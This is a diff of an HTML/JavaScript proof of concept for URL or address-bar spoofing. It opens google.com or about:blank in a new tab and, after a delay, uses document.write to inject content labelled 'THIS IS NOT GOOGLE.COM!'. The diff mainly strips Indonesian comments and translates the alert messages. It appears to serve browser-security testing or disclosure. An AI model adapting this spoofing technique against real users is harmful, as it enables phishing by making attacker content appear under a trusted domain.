@@ -19,7 +19,6 @@
 <body>
   <div class="card">
     <h1>THIS IS NOT GOOGLE.COM!</h1>
-
     <div class="controls" aria-hidden>
       <label>
         Delay (ms):
@@ -28,32 +27,26 @@
 
       <button id="openSpoof">Trigger Spoof</button>
     </div>
-
-    </div>
+  </div>
 
 <script>
   function trySpoof(targetUrl, delayMs) {
-    // buka tab baru yang menavigasi ke targetUrl
-    // jika targetUrl adalah about:blank, navigasi ke google dilakukan setelah injeksi
     let win;
     try {
       win = window.open(targetUrl, "_blank");
     } catch (e) {
       console.warn("window.open blocked:", e);
-      alert("window.open blocked oleh environment.");
+      alert("window.open blocked by environment.");
       return;
     }
-
-    // safety: cek objek window
     if (!win) {
-      alert("Gagal membuka window baru (popup blocked). Pastikan popup diizinkan.");
+      alert("Popup blocked. Ensure popup is allowed.");
       return;
     }
 
-    // setelah delay, coba tulis konten attacker ke dokumen window
     setTimeout(() => {
       try {
-        // NOTE: ini akan melempar jika navigasi sudah cross-origin protected
+
         win.document.open();
         win.document.write(`
           <meta charset="utf-8">
@@ -67,7 +60,7 @@
         console.log("Injection attempted (document.write).");
       } catch (err) {
         console.warn("Blocked by browser protections:", err);
-        // tampilkan pesan singkat untuk debugging
+
         try {
           win.document.open();
           win.document.write("<p style='font-family:system-ui;color:#900'>Blocked by browser protections: " + (err && err.message) + "</p>");
@@ -79,12 +72,10 @@
 
   document.getElementById('openSpoof').addEventListener('click', () => {
     const delay = Math.max(0, parseInt(document.getElementById('delay').value || "300", 10));
-    // variant yang membuka target langsung (mirip PoC yang kamu jelaskan)
     trySpoof("https://www.google.com/", delay);
   });
 
   document.getElementById('openAbout').addEventListener('click', () => {
-    // alternate flow: buka about:blank lalu setelah injeksi navigasi ke google
     const delay = Math.max(0, parseInt(document.getElementById('delay').value || "50", 10));
     let win = window.open("about:blank", "_blank");
     if (!win) { alert("Popup blocked"); return; }
@@ -99,7 +90,6 @@
           <p>Now will navigate to google after short timeout.</p>
         `);
         win.document.close();
-        // lalu navigasi ke google (serupa transisi yang dapat 'stuck' di beberapa webviews)
         win.location.href = "https://www.google.com/";
       } catch (err) {
         console.warn("Blocked during about:blank flow:", err);
